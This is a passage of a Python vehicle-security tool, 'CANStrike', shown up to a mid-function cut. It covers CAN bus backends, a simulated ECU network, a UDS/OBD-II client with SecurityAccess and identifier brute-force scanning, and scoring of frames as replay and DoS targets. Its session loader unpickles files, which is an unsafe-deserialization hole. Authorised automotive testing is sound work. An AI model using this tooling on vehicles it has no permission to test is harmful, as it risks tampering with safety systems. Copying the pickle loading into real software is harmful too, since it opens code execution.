#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║   ██████╗ █████╗ ███╗  ██╗███████╗████████╗██████╗ ██╗██╗  ██╗███████╗    ║
║  ██╔════╝██╔══██╗████╗ ██║██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝    ║
║  ██║     ███████║██╔██╗██║███████╗   ██║   ██████╔╝██║█████╔╝ █████╗      ║
║  ██║     ██╔══██║██║╚████║╚════██║   ██║   ██╔══██╗██║██╔═██╗ ██╔══╝      ║
║  ╚██████╗██║  ██║██║ ╚███║███████║   ██║   ██║  ██║██║██║  ██╗███████╗    ║
║   ╚═════╝╚═╝  ╚═╝╚═╝  ╚══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝   ║
║                                                                              ║
║   CANStrike v4.0  —  CAN Bus Attack & Analysis Utility                      ║
║   ├─ Backends   : CANPico (SLCAN)  |  vcan0 (SocketCAN)                    ║
║   ├─ Analysis   : Delta-diff ID,  Baseline vs Triggered,  AI Scoring       ║
║   ├─ Attacks    : Replay+Mutate, DoS, FreezDOM, Bus-Off, Fuzz, Spoof       ║
║   ├─ Protocol   : UDS / OBD-II service layer                               ║
║   ├─ Monitor    : Live real-time bus scroll view                            ║
║   ├─ Session    : Save / Load captures to disk                              ║
║   ├─ Reporting  : HTML pentest report generation                            ║
║   ├─ Scripting  : Automated attack-chain playbook runner                   ║
║   └─ Simulator  : Responsive vcan0 ECU network                             ║
║                                                                              ║
║   Kali Linux  |  FOR AUTHORIZED SECURITY RESEARCH ONLY                     ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ═══════════════════════════════════════════════════════════════════════════════
#  IMPORTS
# ═══════════════════════════════════════════════════════════════════════════════
import os, sys, time, random, threading, argparse, json, csv, logging
import pickle, subprocess, signal, textwrap, struct, hashlib
from abc import ABC, abstractmethod
from collections import Counter, defaultdict
from copy import deepcopy
from datetime import datetime
from typing import Optional, List, Dict, Tuple, Any

# ── optional rich ─────────────────────────────────────────────────────────────
try:
    from rich.console import Console
    from rich.table   import Table
    from rich.live    import Live
    from rich.panel   import Panel
    from rich.text    import Text
    from rich         import box
    RICH = True
except ImportError:
    RICH = False

# ── optional pyserial ─────────────────────────────────────────────────────────
try:
    import serial, serial.tools.list_ports
    HAS_SERIAL = True
except ImportError:
    HAS_SERIAL = False

# ── optional python-can ───────────────────────────────────────────────────────
try:
    import can
    HAS_CAN = True
except ImportError:
    HAS_CAN = False

# ═══════════════════════════════════════════════════════════════════════════════
#  LOGGING
# ═══════════════════════════════════════════════════════════════════════════════
logging.basicConfig(
    filename="canstrike_{}.log".format(datetime.now().strftime("%Y%m%d_%H%M%S")),
    level=logging.DEBUG,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
log = logging.getLogger("canstrike")

# ═══════════════════════════════════════════════════════════════════════════════
#  COLOUR HELPERS
# ═══════════════════════════════════════════════════════════════════════════════
RESET = "\033[0m"
GREEN = "\033[92m"; CYAN  = "\033[96m"; YELLOW = "\033[93m"
RED   = "\033[91m"; MAG   = "\033[95m"; DIM    = "\033[2m"
BOLD  = "\033[1m";  ORG   = "\033[38;5;208m"; BLUE = "\033[94m"
WHITE = "\033[97m"

def c(t, col=GREEN): return "{}{}{}".format(col, t, RESET)
def ts(): return datetime.now().strftime("%H:%M:%S")
def pr(msg, col=GREEN): print("{} {}".format(c("[{}]".format(ts()), DIM), c(msg, col)))
def hr(col=DIM): print(c("  " + "─" * 62, col))


# ═══════════════════════════════════════════════════════════════════════════════
#  FRAME DATATYPE  (standardised across all backends)
# ═══════════════════════════════════════════════════════════════════════════════
def make_frame(arb_id: int, data: bytes, extended: bool = False) -> Dict:
    return {"id": arb_id, "dlc": len(data), "data": data,
            "extended": extended, "ts": time.time()}


# ═══════════════════════════════════════════════════════════════════════════════
#  ABSTRACT BUS INTERFACE
# ═══════════════════════════════════════════════════════════════════════════════
class BusInterface(ABC):
    @abstractmethod
    def connect(self) -> bool: ...
    @abstractmethod
    def disconnect(self): ...
    @abstractmethod
    def send_frame(self, arb_id: int, data: bytes, extended: bool = False) -> bool: ...
    @abstractmethod
    def flush_rx(self) -> List[Dict]: ...

    def capture(self, duration: float = 3.0) -> List[Dict]:
        self.flush_rx()
        time.sleep(duration)
        return self.flush_rx()

    @property
    @abstractmethod
    def label(self) -> str: ...


# ═══════════════════════════════════════════════════════════════════════════════
#  BACKEND A — CANPico (USB / SLCAN)
# ═══════════════════════════════════════════════════════════════════════════════
class CANPicoBackend(BusInterface):
    SLCAN_SPEEDS = {125000:"S2", 250000:"S4", 500000:"S6", 1000000:"S8"}

    def __init__(self, port: str, baudrate: int = 500000):
        if not HAS_SERIAL:
            raise RuntimeError("pip3 install pyserial")
        self.port = port; self.baudrate = baudrate
        self.ser = None
        self._buf: List[Dict] = []
        self._running = False
        self._lock = threading.Lock()
        self._thread = None

    @property
    def label(self): return "CANPico {} {}K".format(self.port, self.baudrate//1000)

    def connect(self) -> bool:
        try:
            self.ser = serial.Serial(self.port, 115200, timeout=2, write_timeout=2)
            time.sleep(0.5)
            self._raw(b"\r\r\r"); time.sleep(0.2)
            self._raw("{}\r".format(self.SLCAN_SPEEDS.get(self.baudrate,"S4")).encode())
            time.sleep(0.1)
            self._raw(b"O\r"); time.sleep(0.2)
            self._start_rx()
            return True
        except Exception as e:
            log.error("CANPico connect: {}".format(e)); return False

    def disconnect(self):
        self._running = False
        if self._thread: self._thread.join(timeout=2)
        if self.ser and self.ser.is_open:
            try: self._raw(b"C\r")
            except: pass
            self.ser.close()

    def _raw(self, d: bytes):
        if self.ser and self.ser.is_open: self.ser.write(d); self.ser.flush()

    def send_frame(self, arb_id: int, data: bytes, extended: bool = False) -> bool:
        try:
            hid = "{:03X}".format(arb_id) if not extended else "{:08X}".format(arb_id)
            cmd = "{}{}{}{}\r".format("t" if not extended else "T",
                                      hid, len(data), data.hex().upper())
            self._raw(cmd.encode()); return True
        except Exception as e:
            log.error("CANPico TX: {}".format(e)); return False

    def _parse(self, line: str) -> Optional[Dict]:
        line = line.strip()
        try:
            if line.startswith("t") and len(line) > 4:
                aid=int(line[1:4],16); dlc=int(line[4])
                return make_frame(aid, bytes.fromhex(line[5:5+dlc*2]))
            elif line.startswith("T") and len(line) > 9:
                aid=int(line[1:9],16); dlc=int(line[9])
                return make_frame(aid, bytes.fromhex(line[10:10+dlc*2]), True)
        except: pass
        return None

    def _rx_loop(self):
        buf = b""
        while self._running and self.ser and self.ser.is_open:
            try:
                chunk = self.ser.read(64)
                if chunk:
                    buf += chunk
                    while b"\r" in buf:
                        line, buf = buf.split(b"\r", 1)
                        f = self._parse(line.decode(errors="ignore"))
                        if f:
                            with self._lock: self._buf.append(f)
            except: pass

    def _start_rx(self):
        self._running = True
        self._thread = threading.Thread(target=self._rx_loop, daemon=True)
        self._thread.start()

    def flush_rx(self) -> List[Dict]:
        with self._lock:
            out = list(self._buf); self._buf.clear()
        return out


# ═══════════════════════════════════════════════════════════════════════════════
#  BACKEND B — vcan0 / SocketCAN (python-can)
# ═══════════════════════════════════════════════════════════════════════════════
class VCanBackend(BusInterface):
    def __init__(self, channel: str = "vcan0", interface: str = "socketcan",
                 bitrate: int = 500000):
        if not HAS_CAN: raise RuntimeError("pip3 install python-can")
        self.channel = channel; self.interface = interface; self.bitrate = bitrate
        self._bus = None
        self._buf: List[Dict] = []
        self._running = False
        self._lock = threading.Lock()
        self._thread = None

    @property
    def label(self): return "SocketCAN {} ({})".format(self.channel, self.interface)

    def connect(self) -> bool:
        try:
            self._bus = can.interface.Bus(channel=self.channel,
                                          interface=self.interface,
                                          bitrate=self.bitrate)
            self._start_rx(); return True
        except Exception as e:
            log.error("VCan connect: {}".format(e)); return False

    def disconnect(self):
        self._running = False
        if self._thread: self._thread.join(timeout=2)
        if self._bus:
            try: self._bus.shutdown()
            except: pass

    def send_frame(self, arb_id: int, data: bytes, extended: bool = False) -> bool:
        try:
            msg = can.Message(arbitration_id=arb_id, data=data,
                              is_extended_id=extended, is_fd=False)
            self._bus.send(msg); return True
        except Exception as e:
            log.error("VCan TX: {}".format(e)); return False

    def _rx_loop(self):
        while self._running and self._bus:
            try:
                msg = self._bus.recv(timeout=0.1)
                if msg:
                    f = make_frame(msg.arbitration_id, bytes(msg.data), msg.is_extended_id)
                    f["ts"] = msg.timestamp or time.time()
                    with self._lock: self._buf.append(f)
            except: pass

    def _start_rx(self):
        self._running = True
        self._thread = threading.Thread(target=self._rx_loop, daemon=True)
        self._thread.start()

    def flush_rx(self) -> List[Dict]:
        with self._lock:
            out = list(self._buf); self._buf.clear()
        return out


# ═══════════════════════════════════════════════════════════════════════════════
#  RESPONSIVE vcan0 SIMULATOR  (ECUs that react to requests)
# ═══════════════════════════════════════════════════════════════════════════════
class VCanSimulator:
    """
    Six virtual ECUs on vcan0.  OBD-II and UDS ECUs respond
    to incoming requests — not just broadcast blindly.

    Broadcast ECUs:
      0x100  Engine   — RPM / throttle / temp      10 ms
      0x200  Trans    — gear / speed               20 ms
      0x300  ABS      — wheel speeds               10 ms
      0x400  BCM      — doors / lights            100 ms

    Responsive ECUs (request → response):
      0x7E0→0x7E8  OBD-II tester / ECU  (ISO 15765-4)
      0x700→0x708  UDS ECU              (ISO 14229)
    """

    def __init__(self, channel: str = "vcan0"):
        self.channel  = channel
        self._bus_tx  = None   # TX bus (simulator → tool)
        self._bus_rx  = None   # RX bus (listen for requests)
        self._running = False
        self._threads: List[threading.Thread] = []

    def setup_vcan(self) -> bool:
        for cmd in [["sudo","modprobe","vcan"],
                    ["sudo","ip","link","add","dev",self.channel,"type","vcan"],
                    ["sudo","ip","link","set","up",self.channel]]:
            r = subprocess.run(cmd, capture_output=True)
            if r.returncode != 0:
                err = r.stderr.decode()
                if "already exists" not in err and "File exists" not in err:
                    log.warning("vcan cmd: {}".format(err))
        r = subprocess.run(["ip","link","show",self.channel], capture_output=True)
        return r.returncode == 0

    def start(self) -> bool:
        if not HAS_CAN:
            pr("pip3 install python-can", RED); return False
        if not self.setup_vcan():
            pr("Cannot bring up {} — try manually".format(self.channel), RED)
            return False
        try:
            self._bus_tx = can.interface.Bus(channel=self.channel, interface="socketcan")
            self._bus_rx = can.interface.Bus(channel=self.channel, interface="socketcan")
            self._running = True

            # Broadcast ECUs
            for ecuid, name, ivl, fn in [
                (0x100,"Engine",  0.010, self._d_engine),
                (0x200,"Trans",   0.020, self._d_trans),
                (0x300,"ABS",     0.010, self._d_abs),
                (0x400,"BCM",     0.100, self._d_bcm),
            ]:
                t = threading.Thread(target=self._bcast_loop,
                                     args=(ecuid, ivl, fn), daemon=True)
                t.start(); self._threads.append(t)

            # Responsive listener
            t = threading.Thread(target=self._resp_loop, daemon=True)
            t.start(); self._threads.append(t)

            pr("Simulator started on {} — {} ECUs".format(self.channel, 6), GREEN)
            for row in [("0x100","Engine   ","10ms","RPM/throttle/temp — broadcast"),
                        ("0x200","Trans    ","20ms","Gear/speed — broadcast"),
                        ("0x300","ABS      ","10ms","Wheel speeds — broadcast"),
                        ("0x400","BCM      ","100ms","Doors/lights — broadcast"),
                        ("0x7E0→0x7E8","OBD-II","on req","Responds to SID 01,02,03,09"),
                        ("0x700→0x708","UDS ECU","on req","SID 10,11,22,27,2E,31,3E")]:
                pr("  {:<18}{:<10}{:<8}{}".format(*row), DIM)
            return True
        except Exception as e:
            pr("Simulator failed: {}".format(e), RED); return False

    def stop(self):
        self._running = False
        for t in self._threads: t.join(timeout=1)
        for b in [self._bus_tx, self._bus_rx]:
            if b:
                try: b.shutdown()
                except: pass
        self._threads.clear()
        pr("Simulator stopped", YELLOW)

    # ── Broadcast data generators ─────────────────────────────────────────────
    @staticmethod
    def _d_engine():
        rpm = random.randint(800, 6000)
        return bytes([rpm>>8, rpm&0xFF, random.randint(0,100),
                      0x00, random.randint(0x50,0xA0), 0x00, 0x00, 0x00])
    @staticmethod
    def _d_trans():
        return bytes([random.randint(1,8), random.randint(0,200),
                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
    @staticmethod
    def _d_abs():
        return bytes([random.randint(0xA0,0xFF)]*4 + [0x00]*4)
    @staticmethod
    def _d_bcm():
        return bytes([random.choice([0,1]), 0x00,
                      random.choice([0,1]), 0x00, 0x00, 0x00, 0x00, 0x00])

    def _bcast_loop(self, ecuid: int, interval: float, data_fn):
        while self._running and self._bus_tx:
            try:
                msg = can.Message(arbitration_id=ecuid, data=data_fn(),
                                  is_extended_id=False)
                self._bus_tx.send(msg)
            except: pass
            time.sleep(interval)

    # ── Responsive ECU listener ────────────────────────────────────────────────
    def _resp_loop(self):
        """Listen for OBD-II / UDS requests and send realistic responses."""
        while self._running and self._bus_rx:
            try:
                msg = self._bus_rx.recv(timeout=0.1)
                if not msg: continue
                aid  = msg.arbitration_id
                data = bytes(msg.data)
                resp = None

                # OBD-II  request=0x7E0  response=0x7E8
                if aid == 0x7E0 and len(data) >= 2:
                    resp_id = 0x7E8
                    sid     = data[1] if data[0] >= 1 else 0
                    if sid == 0x01:   # Current data
                        pid = data[2] if len(data) > 2 else 0x00
                        resp = self._obd_sid01(pid)
                    elif sid == 0x03: # Read DTCs
                        resp = bytes([0x06,0x43,0x01,0x33,0x00,0x00,0x00,0x00])
                    elif sid == 0x09: # Vehicle info
                        resp = bytes([0x07,0x49,0x02,0x01]+list(b"1HGBH4"[:4]))
                    if resp:
                        self._send_resp(resp_id, resp)

                # UDS  request=0x700  response=0x708
                elif aid == 0x700 and len(data) >= 2:
                    resp_id = 0x708
                    sid     = data[1]
                    if sid == 0x10:   # DiagnosticSessionControl
                        resp = bytes([0x02,0x50,data[2] if len(data)>2 else 0x01,
                                      0x00,0x19,0x01,0xF4,0x00])
                    elif sid == 0x11: # ECUReset
                        resp = bytes([0x02,0x51,0x01,0x00,0x00,0x00,0x00,0x00])
                    elif sid == 0x22: # ReadDataByIdentifier
                        did = (data[2]<<8|data[3]) if len(data)>3 else 0xF190
                        resp = self._uds_read_did(did)
                    elif sid == 0x27: # SecurityAccess
                        sub = data[2] if len(data)>2 else 0x01
                        if sub == 0x01:  # requestSeed
                            seed = random.randint(0x1000,0xFFFF)
                            resp = bytes([0x04,0x67,0x01,seed>>8,seed&0xFF,0,0,0])
                        else:           # sendKey (accept anything for sim)
                            resp = bytes([0x02,0x67,0x02,0x00,0x00,0x00,0x00,0x00])
                    elif sid == 0x2E: # WriteDataByIdentifier
                        resp = bytes([0x03,0x6E,data[2] if len(data)>2 else 0xF1,
                                      data[3] if len(data)>3 else 0x90,0,0,0,0])
                    elif sid == 0x3E: # TesterPresent
                        resp = bytes([0x02,0x7E,0x00,0x00,0x00,0x00,0x00,0x00])
                    elif sid == 0x31: # RoutineControl
                        resp = bytes([0x04,0x71,data[2] if len(data)>2 else 0x01,
                                      data[3] if len(data)>3 else 0xFF,
                                      data[4] if len(data)>4 else 0x00,0,0,0])
                    else:             # Negative response
                        resp = bytes([0x03,0x7F,sid,0x11,0,0,0,0])
                    if resp:
                        self._send_resp(resp_id, resp)
            except: pass

    def _send_resp(self, resp_id: int, data: bytes):
        try:
            msg = can.Message(arbitration_id=resp_id,
                              data=data[:8], is_extended_id=False)
            time.sleep(0.002)  # realistic 2ms ECU response delay
            self._bus_tx.send(msg)
        except: pass

    @staticmethod
    def _obd_sid01(pid: int) -> bytes:
        vals = {
            0x05: bytes([0x03,0x41,0x05,0x6E,0,0,0,0]),    # coolant 70°C
            0x0C: bytes([0x04,0x41,0x0C,0x0F,0xA0,0,0,0]),  # RPM 1000
            0x0D: bytes([0x03,0x41,0x0D,0x3C,0,0,0,0]),     # speed 60
            0x11: bytes([0x03,0x41,0x11,0x32,0,0,0,0]),     # throttle 20%
        }
        return vals.get(pid, bytes([0x03,0x41,pid,0x00,0,0,0,0]))

    @staticmethod
    def _uds_read_did(did: int) -> bytes:
        if did == 0xF190:   # VIN
            return bytes([0x08,0x62,0xF1,0x90]+list(b"1HGBH"[:4]))
        elif did == 0xF18C: # ECU serial
            return bytes([0x08,0x62,0xF1,0x8C,0x01,0x02,0x03,0x04])
        return bytes([0x05,0x62,did>>8,did&0xFF,0xAB,0xCD,0x00,0x00])


# ═══════════════════════════════════════════════════════════════════════════════
#  SESSION MANAGER  — save / load capture sessions to disk
# ═══════════════════════════════════════════════════════════════════════════════
class SessionManager:
    """Save and load complete capture sessions (frames + metadata) as .cansession files."""

    @staticmethod
    def save(frames: List[Dict], meta: Dict, path: str):
        session = {
            "version":   "4.0",
            "saved_at":  datetime.now().isoformat(),
            "meta":      meta,
            "frames":    [{"id":f["id"],"dlc":f["dlc"],
                           "data":f["data"].hex(),"ts":f["ts"],
                           "extended":f["extended"]} for f in frames],
        }
        with open(path, "wb") as fh:
            pickle.dump(session, fh)
        pr("Session saved → {}  ({} frames)".format(path, len(frames)), GREEN)

    @staticmethod
    def load(path: str) -> Tuple[List[Dict], Dict]:
        with open(path, "rb") as fh:
            session = pickle.load(fh)
        frames = [{"id":r["id"],"dlc":r["dlc"],
                   "data":bytes.fromhex(r["data"]),"ts":r["ts"],
                   "extended":r["extended"]} for r in session["frames"]]
        pr("Session loaded ← {}  ({} frames, saved {})".format(
           path, len(frames), session.get("saved_at","?")), GREEN)
        return frames, session.get("meta", {})

    @staticmethod
    def list_sessions(directory: str = ".") -> List[str]:
        import glob
        return sorted(glob.glob(os.path.join(directory, "*.cansession")))


# ═══════════════════════════════════════════════════════════════════════════════
#  LIVE BUS MONITOR  — real-time scrolling frame view
# ═══════════════════════════════════════════════════════════════════════════════
class LiveMonitor:
    """
    Displays a live, auto-refreshing table of CAN traffic.
    Press Ctrl-C to stop.
    """

    def __init__(self, bus: BusInterface, max_rows: int = 30):
        self.bus      = bus
        self.max_rows = max_rows
        self._seen: Dict[int, Dict] = {}  # id → latest frame + stats
        self._start   = time.time()
        self._total   = 0

    def run(self):
        pr("Live Monitor — Ctrl-C to stop", CYAN)
        pr("Tracking unique IDs, counts, Hz, and latest data", DIM)
        print()
        if RICH:
            self._run_rich()
        else:
            self._run_plain()

    def _update(self):
        frames = self.bus.flush_rx()
        now = time.time()
        for f in frames:
            fid = f["id"]
            self._total += 1
            if fid not in self._seen:
                self._seen[fid] = {"id": fid, "count": 0, "data": b"",
                                   "first": now, "last": now, "hz": 0.0}
            entry = self._seen[fid]
            elapsed = now - entry["last"]
            entry["hz"]   = 1.0 / elapsed if elapsed > 0 else 0.0
            entry["last"] = now
            entry["data"] = f["data"]
            entry["count"] += 1

    def _build_rich_table(self):
        elapsed = time.time() - self._start
        tbl = Table(
            box=box.SIMPLE_HEAVY, border_style="cyan", expand=True,
            title="[bold cyan]Live CAN Monitor[/]  [dim]{:.1f}s  {} frames  {} IDs[/]".format(
                elapsed, self._total, len(self._seen)))
        tbl.add_column("ID",    style="cyan",   width=8)
        tbl.add_column("DLC",   style="dim",    width=5,  justify="center")
        tbl.add_column("Data",                  width=26)
        tbl.add_column("Count", style="yellow", width=8,  justify="right")
        tbl.add_column("Hz",    style="green",  width=8,  justify="right")

        rows = sorted(self._seen.values(), key=lambda x: x["count"], reverse=True)
        for row in rows[:self.max_rows]:
            hz_col = "green" if row["hz"] > 50 else "yellow" if row["hz"] > 5 else "dim"
            tbl.add_row(
                "0x{:03X}".format(row["id"]),
                str(row["data"] and len(row["data"]) or 0),
                row["data"].hex().upper() if row["data"] else "",
                str(row["count"]),
                "[{}]{:.1f}[/]".format(hz_col, row["hz"]),
            )
        return tbl

    def _run_rich(self):
        con = Console()
        with Live(console=con, refresh_per_second=4, screen=False) as live:
            try:
                while True:
                    self._update()
                    live.update(self._build_rich_table())
                    time.sleep(0.25)
            except KeyboardInterrupt:
                pass
        pr("Monitor stopped — {} unique IDs, {} total frames".format(
           len(self._seen), self._total), GREEN)

    def _run_plain(self):
        try:
            while True:
                self._update()
                os.system("clear")
                elapsed = time.time() - self._start
                print(c("  Live CAN Monitor  {:.1f}s  {} frames  {} IDs  (Ctrl-C stop)".format(
                    elapsed, self._total, len(self._seen)), CYAN))
                print(c("  {:<10}{:<6}{:<26}{:<8}{}".format(
                    "ID","DLC","Data","Count","Hz"), CYAN))
                print(c("  " + "-" * 54, DIM))
                for row in sorted(self._seen.values(),
                                  key=lambda x: x["count"], reverse=True)[:self.max_rows]:
                    col = GREEN if row["hz"] > 50 else YELLOW if row["hz"] > 5 else DIM
                    id_s = c("0x{:03X}".format(row["id"]), CYAN)
                    hz_s = c("{:.1f}".format(row["hz"]), col)
                    print("  {:<18}{:<6}{:<26}{:<8}{}".format(
                        id_s, len(row["data"]),
                        row["data"].hex().upper(), row["count"], hz_s))
                time.sleep(0.5)
        except KeyboardInterrupt:
            pass
        pr("Monitor stopped", GREEN)


# ═══════════════════════════════════════════════════════════════════════════════
#  UDS / OBD-II SERVICE LAYER
# ═══════════════════════════════════════════════════════════════════════════════
class UDSClient:
    """
    Sends UDS (ISO 14229) and OBD-II (ISO 15765) service requests
    and parses responses.
    """

    OBD_PIDS = {
        0x05: "Coolant Temp",  0x0C: "Engine RPM",
        0x0D: "Vehicle Speed", 0x11: "Throttle Pos",
        0x1F: "Run Time",      0x2F: "Fuel Level",
        0x31: "Dist w/ MIL",   0x46: "Ambient Temp",
    }
    UDS_SIDS = {
        0x10: "DiagnosticSessionControl",
        0x11: "ECUReset",
        0x22: "ReadDataByIdentifier",
        0x27: "SecurityAccess",
        0x2E: "WriteDataByIdentifier",
        0x31: "RoutineControl",
        0x3E: "TesterPresent",
        0x14: "ClearDTCs",
    }
    NEG_CODES = {
        0x10:"generalReject", 0x11:"serviceNotSupported",
        0x12:"subFunctionNotSupported", 0x13:"incorrectMessageLength",
        0x22:"conditionsNotCorrect", 0x24:"requestSequenceError",
        0x25:"noResponseFromSubnetComponent", 0x31:"requestOutOfRange",
        0x33:"securityAccessDenied", 0x35:"invalidKey",
        0x36:"exceededNumberOfAttempts", 0x37:"requiredTimeDelayNotExpired",
    }

    def __init__(self, bus: BusInterface,
                 req_id: int = 0x7E0, resp_id: int = 0x7E8,
                 timeout: float = 1.0):
        self.bus     = bus
        self.req_id  = req_id
        self.resp_id = resp_id
        self.timeout = timeout

    def _send_recv(self, payload: bytes) -> Optional[bytes]:
        """Send a single-frame UDS/OBD request and wait for response."""
        self.bus.flush_rx()
        frame_data = bytes([len(payload)]) + payload[:7]
        frame_data = frame_data.ljust(8, b"\x00")
        self.bus.send_frame(self.req_id, frame_data)
        deadline = time.time() + self.timeout
        while time.time() < deadline:
            for f in self.bus.flush_rx():
                if f["id"] == self.resp_id:
                    return f["data"]
            time.sleep(0.01)
        return None

    def _parse_resp(self, raw: bytes) -> Dict:
        if not raw or len(raw) < 2:
            return {"ok": False, "error": "No response / timeout"}
        sid = raw[1]
        if sid == 0x7F:  # Negative response
            nrc = raw[3] if len(raw) > 3 else 0
            return {"ok": False, "neg_sid": raw[2],
                    "nrc": nrc, "nrc_str": self.NEG_CODES.get(nrc, "unknown"),
                    "raw": raw}
        return {"ok": True, "sid": sid, "data": raw[2:], "raw": raw}

    # ── OBD-II ────────────────────────────────────────────────────────────────
    def obd_read_pid(self, pid: int) -> Dict:
        """SID 01 — Read current data PID."""
        raw  = self._send_recv(bytes([0x02, 0x01, pid]))
        resp = self._parse_resp(raw)
        if resp["ok"] and len(resp.get("data", b"")) >= 1:
            resp["pid"]     = pid
            resp["pid_name"]= self.OBD_PIDS.get(pid, "PID 0x{:02X}".format(pid))
            d = resp["data"]
            # Basic scaling for known PIDs
            if pid == 0x0C and len(d) >= 2:  # RPM
                resp["value"] = ((d[0]*256)+d[1]) / 4.0
                resp["unit"]  = "RPM"
            elif pid == 0x0D and len(d) >= 1: # Speed
                resp["value"] = d[0]; resp["unit"] = "km/h"
            elif pid == 0x05 and len(d) >= 1: # Coolant
                resp["value"] = d[0] - 40; resp["unit"] = "°C"
            elif pid == 0x11 and len(d) >= 1: # Throttle
                resp["value"] = round(d[0] * 100/255, 1); resp["unit"] = "%"
        return resp

    def obd_read_dtcs(self) -> List[str]:
        """SID 03 — Read stored DTCs."""
        raw = self._send_recv(bytes([0x01, 0x03]))
        if not raw or len(raw) < 3: return []
        n = raw[1]; dtcs = []
        for i in range(n):
            base = 2 + i*2
            if base+1 >= len(raw): break
            b1, b2 = raw[base], raw[base+1]
            prefix = ["P","C","B","U"][(b1>>6)&0x03]
            dtcs.append("{}{:01X}{:02X}".format(prefix, b1&0x3F, b2))
        return dtcs

    def obd_scan_pids(self) -> List[int]:
        """SID 01 PID 00 — Get supported PIDs."""
        raw = self._send_recv(bytes([0x02, 0x01, 0x00]))
        if not raw or len(raw) < 6: return []
        mask = (raw[2]<<24)|(raw[3]<<16)|(raw[4]<<8)|raw[5]
        return [i+1 for i in range(32) if mask & (1<<(31-i))]

    # ── UDS ───────────────────────────────────────────────────────────────────
    def uds_session(self, mode: int = 0x03) -> Dict:
        """SID 10 — DiagnosticSessionControl."""
        return self._parse_resp(self._send_recv(bytes([0x02, 0x10, mode])))

    def uds_ecu_reset(self, reset_type: int = 0x01) -> Dict:
        """SID 11 — ECUReset."""
        return self._parse_resp(self._send_recv(bytes([0x02, 0x11, reset_type])))

    def uds_read_did(self, did: int) -> Dict:
        """SID 22 — ReadDataByIdentifier."""
        return self._parse_resp(
            self._send_recv(bytes([0x03, 0x22, did>>8, did&0xFF])))

    def uds_security_access(self) -> Tuple[bool, Optional[int]]:
        """SID 27 — Request seed then compute/send dummy key."""
        raw = self._send_recv(bytes([0x02, 0x27, 0x01]))
        resp = self._parse_resp(raw)
        if not resp["ok"]: return False, None
        d = resp.get("data", b"")
        seed = (d[1]<<8|d[2]) if len(d) >= 3 else 0
        # Dummy key computation (XOR with 0xAAAA — simulator accepts anything)
        key = seed ^ 0xAAAA
        raw2 = self._send_recv(bytes([0x04, 0x27, 0x02, key>>8, key&0xFF]))
        resp2 = self._parse_resp(raw2)
        return resp2["ok"], seed

    def uds_tester_present(self) -> Dict:
        """SID 3E — Keep session alive."""
        return self._parse_resp(self._send_recv(bytes([0x02, 0x3E, 0x00])))

    def uds_routine_control(self, rid: int, sub: int = 0x01) -> Dict:
        """SID 31 — RoutineControl."""
        return self._parse_resp(
            self._send_recv(bytes([0x04, 0x31, sub, rid>>8, rid&0xFF])))

    def uds_write_did(self, did: int, value: bytes) -> Dict:
        """SID 2E — WriteDataByIdentifier."""
        payload = bytes([2+len(value), 0x2E, did>>8, did&0xFF]) + value
        return self._parse_resp(self._send_recv(payload))

    def scan_uds_dids(self, start: int = 0xF180, end: int = 0xF1FF) -> List[Dict]:
        """Brute-force scan DID range for readable identifiers."""
        found = []
        pr("Scanning UDS DIDs 0x{:04X}–0x{:04X}...".format(start, end), CYAN)
        for did in range(start, end+1):
            resp = self.uds_read_did(did)
            if resp["ok"]:
                found.append({"did": did, "data": resp.get("data", b"")})
                pr("  DID 0x{:04X} readable: {}".format(
                   did, resp.get("data",b"").hex().upper()), GREEN)
        pr("DID scan done — {} readable".format(len(found)), GREEN)
        return found


# ═══════════════════════════════════════════════════════════════════════════════
#  AI ANALYST v2  — Baseline vs Triggered delta comparison
# ═══════════════════════════════════════════════════════════════════════════════
class Analyst:
    """
    Improved analyst that can:
    1. Score attacks from a single snapshot (original behaviour)
    2. Compare baseline vs triggered captures (delta-diff mode)
       — eliminates periodic false positives
    """

    # ── Delta diff ────────────────────────────────────────────────────────────
    @staticmethod
    def delta_diff(baseline: List[Dict], triggered: List[Dict]) -> List[Dict]:
        """
        Compare baseline (bus at rest) vs triggered (action performed).
        Returns packets that appeared or changed during the triggered capture.
        """
        def summarise(frames: List[Dict]) -> Dict[int, Dict]:
            out: Dict[int, Dict] = {}
            for f in frames:
                fid = f["id"]
                if fid not in out:
                    out[fid] = {"count": 0, "payloads": set(), "id": fid}
                out[fid]["count"] += 1
                out[fid]["payloads"].add(f["data"])
            return out

        base_map = summarise(baseline)
        trig_map = summarise(triggered)
        results  = []

        for fid, tdata in trig_map.items():
            if fid not in base_map:
                # NEW ID — appeared only in triggered capture
                results.append({
                    "id":       fid,
                    "id_hex":   "0x{:03X}".format(fid),
                    "reason":   "NEW",
                    "detail":   "ID absent in baseline — appeared on action",
                    "confidence": 95,
                    "sample":   list(tdata["payloads"])[0] if tdata["payloads"] else b"",
                })
            else:
                bdata = base_map[fid]
                # Changed payload
                new_payloads = tdata["payloads"] - bdata["payloads"]
                if new_payloads:
                    results.append({
                        "id":       fid,
                        "id_hex":   "0x{:03X}".format(fid),
                        "reason":   "CHANGED",
                        "detail":   "{} new payload(s) vs baseline".format(len(new_payloads)),
                        "confidence": 80,
                        "sample":   list(new_payloads)[0],
                    })
                # Rate spike
                b_rate = bdata["count"] / max(1, len(baseline))
                t_rate = tdata["count"] / max(1, len(triggered))
                if t_rate > b_rate * 2.5:
                    results.append({
                        "id":       fid,
                        "id_hex":   "0x{:03X}".format(fid),
                        "reason":   "RATE SPIKE",
                        "detail":   "Rate x{:.1f} vs baseline".format(t_rate/max(b_rate,0.001)),
                        "confidence": 70,
                        "sample":   b"",
                    })

        results.sort(key=lambda x: x["confidence"], reverse=True)
        return results

    # ── Attack scorers ────────────────────────────────────────────────────────
    def _score_replay(self, frames):
        ids = [f["id"] for f in frames]
        rep = {i:n for i,n in Counter(ids).items() if n > 3}
        if rep:
            best = max(rep, key=rep.get)
            return (85,"0x{:03X}".format(best),
                    "Periodic 0x{:03X} x{} — ideal replay target".format(best,rep[best]))
        return (40,None,"No strongly periodic frames")

    def _score_dos(self, frames):
        if not frames: return (20,None,"No frames — bus silent")
        span = max(0.1, frames[-1]["ts"] - frames[0]["ts"])
        rate = len(frames)/span
        if rate < 50:
            return (95,None,"LOW load ({:.0f}fps) — DoS will dominate".format(rate))
        elif rate < 300:
